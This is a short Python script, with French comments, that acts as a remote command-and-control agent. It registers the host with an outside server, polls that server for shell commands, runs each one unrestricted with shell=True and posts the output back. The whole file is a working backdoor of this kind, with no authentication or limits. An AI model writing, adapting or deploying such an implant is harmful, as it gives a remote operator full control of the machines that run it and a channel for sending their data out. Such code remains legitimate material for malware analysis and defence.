import os
import time
import json
import socket
import requests
import subprocess

SERVER = os.environ.get("SERVER", "https://controler.pythonanywhere.com")
HOSTNAME = os.environ.get("HOSTNAME") or socket.gethostname()
POLL_EVERY_SEC = float(os.environ.get("POLL_EVERY_SEC", "2.0"))

def execute_shell(command: str) -> str:
    """Exécute une commande shell brute et renvoie stdout + stderr."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True
        )
        output = result.stdout
        if result.stderr:
            output += "\n[stderr]\n" + result.stderr
        return output.strip()
    except Exception as e:
        return f"[ERROR] {type(e).__name__}: {e}"

def post(url: str, payload: dict):
    r = requests.post(url, headers={"Content-Type": "application/json"},
                      data=json.dumps(payload), timeout=10)
    r.raise_for_status()
    return r

def get(url: str, params: dict):
    r = requests.get(url, params=params, timeout=10)
    r.raise_for_status()
    return r

def main():
    last_id = 0

    # s’enregistre auprès du serveur
    try:
        post(f"{SERVER}/register", {"host": HOSTNAME})
    except Exception as e:
        print("[register-error]", e)

    while True:
        try:
            r = get(f"{SERVER}/commande", params={"host": HOSTNAME, "after": last_id})
            cmd = r.json() or {}
            if "id" not in cmd:
                time.sleep(POLL_EVERY_SEC)
                continue

            cmd_id = cmd["id"]
            command = cmd.get("command", "")

            if last_id == cmd_id:
                time.sleep(POLL_EVERY_SEC)
                continue

            output = execute_shell(command)

            post(f"{SERVER}/output", {
                "command_id": cmd_id,
                "output": output,
                "host": HOSTNAME
            })

            last_id = cmd_id
        except Exception as e:
            time.sleep(POLL_EVERY_SEC)

if __name__ == "__main__":
    main()